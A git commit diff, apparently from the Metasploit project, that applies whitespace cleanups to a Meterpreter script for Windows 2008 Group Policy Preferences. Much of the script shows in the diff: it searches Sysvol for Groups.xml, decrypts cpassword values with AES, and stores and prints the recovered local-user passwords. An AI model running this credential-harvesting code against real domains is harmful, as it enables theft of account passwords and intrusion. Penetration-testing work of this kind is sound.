7f55a93d1c3a5351687bf3f23b6d2c27ea7e19df
Loic Jaquemet <loic.jaquemet+github@gmail.com>
2012-04-30 10:21:11 -0600

    msftidy.rb fixes

--- scripts/meterpreter/gp_users_decrypt.rb
+++ scripts/meterpreter/gp_users_decrypt.rb
@@ -1,8 +1,8 @@
 ## Meterpreter script that search for GPO local users password - win2k8
 ##
 ## Based on Gpprefdecrypt.py - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.
-##  http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences ( emilien girault ) 
-## 
+##  http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences ( emilien girault )
+##
 ## This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.
 ## files matching a given pattern
 ##
@@ -27,18 +27,18 @@ f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
 	aes.padding = 0
 	aes.decrypt
 	aes.key = key
-	password = (aes.update(encoded) + aes.final) 
-	# take suffix out	
+	password = (aes.update(encoded) + aes.final)
+	# take suffix out
 	password = password[0..-(password[-1].ord+1)]
 	return password
 end
 
-LocalUser = Struct.new(:name, :cpassword, :action, :changeLogon, :noChange, 
-						   :neverExpires, :acctDisabled, :subAuthority, :changed)
+LocalUser = Struct.new(:name, :cpassword, :action, :changeLogon, :noChange,
+							:neverExpires, :acctDisabled, :subAuthority, :changed)
 def parseUsers(text)
 	# parse the xml to find all users.
-    doc = (REXML::Document.new text).root
-    doc.elements.to_a("//User/Properties").each do |p|
+	doc = (REXML::Document.new text).root
+	doc.elements.to_a("//User/Properties").each do |p|
 		next if p.attributes["cpassword"].empty?
 		localuser = LocalUser.new
 		localuser.name = p.attributes["newName"]
@@ -52,7 +52,7 @@ def parseUsers(text)
 		localuser.acctDisabled = p.attributes["acctDisabled"]
 		localuser.subAuthority = p.attributes["subAuthority"]
 		localuser.changed = p.parent.attributes["changed"]
-		yield localuser 
+		yield localuser
 	end
 end
 
@@ -66,12 +66,12 @@ def scanGroupsFile(groupsfile)
 			parseUsers(temp) { |localuser|
 				## store_creds
 				client.framework.db.report_auth_info(
-                    :host  => client.sock.peerhost,
-                    :port  => 445,
-                    :sname => 'smb',
-                    :user  => localuser.name,
-                    :pass  => localuser.cpassword,
-            	)
+					:host  => client.sock.peerhost,
+					:port  => 445,
+					:sname => 'smb',
+					:user  => localuser.name,
+					:pass  => localuser.cpassword,
+					)
 				print_status "#{localuser.name}: #{localuser.cpassword}  -  #{localuser.changed} "
 			}
 		end
@@ -138,7 +138,7 @@ def scanPoliciesPath(server)
 		fullpath = dirname +  dom + '\\' + "Policies"
 
 		if client.fs.file.stat(fullpath).directory?
-			searchGroupsFile(fullpath) { |groupsfile| 
+			searchGroupsFile(fullpath) { |groupsfile|
 				scanGroupsFile groupsfile
 			}
 		end
@@ -167,8 +167,8 @@ end
 	case opt
 	when "-h"
 		usage
-    when "-s"
-        server = "\\\\#{val}"
+	when "-s"
+		server = "\\\\#{val}"
 	end
 }
 
@@ -177,9 +177,9 @@ if client.platform =~ /win32|win64/
 		print_line "server needs to be specified"
 		return
 	end
-    
+
 	scanPoliciesPath(server)
 else
-    print_error("This version of Meterpreter is not supported with this Script!")
-    raise Rex::Script::Completed
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
